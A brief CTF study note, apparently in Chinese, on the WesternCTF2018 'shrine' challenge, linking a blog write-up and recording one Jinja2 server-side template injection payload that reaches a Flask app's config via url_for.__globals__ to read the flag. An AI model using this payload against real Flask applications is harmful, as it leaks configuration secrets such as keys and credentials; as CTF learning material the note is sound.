# WP
[[WesternCTF2018]shrine(SSTI+过滤) - Hel10 - 博客园](https://www.cnblogs.com/HelloCTF/p/13149635.html)
# 知识点
SSTI找config
```php
{{url_for.__globals__['current_app'].config['FLAG']}}
```

